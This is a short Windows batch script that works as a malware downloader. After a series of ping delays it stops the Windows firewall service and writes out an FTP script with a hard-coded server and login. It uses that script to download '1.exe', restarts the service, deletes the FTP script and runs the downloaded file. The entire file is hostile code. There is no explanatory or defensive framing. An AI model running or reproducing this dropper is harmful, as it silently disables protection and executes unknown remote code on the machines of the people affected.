ping -n 1 127.1>nul
ping -n 3 127.1>nul
ping -n 1 127.1>nul
ping -n 1 127.1>nul
ping -n 1 127.1>nul
ping -n 1 127.1>nul
ping -n 1 127.1>nul
ping -n 3 127.1>nul
ping -n 1 127.1>nul
ping -n 1 127.1>nul
ping -n 1 127.1>nul
ping -n 1 127.1>nul
ping -n 1 127.1>nul
ping -n 1 127.1>nul
ping -n 1 127.1>nul
ping -n 1 127.1>nul
ping -n 1 127.1>nul
ping -n 1 127.1>nul
ping -n 1 127.1>nul
ping -n 1 127.1>nul
ping -n 1 127.1>nul
sc stop sharedaccess
@echo open www.rttrrt.cn 21>d.dat
@echo rttrrt>>d.dat
@echo zhenhao>>d.dat
@echo cd wwwroot>>d.dat
@echo binary>>d.dat
@echo get 1.exe>>d.dat
@echo bye>>d.dat
ftp -s:d.dat
sc start sharedaccess
ping -n 1 127.1>nul
del d.dat
1.exe
exit
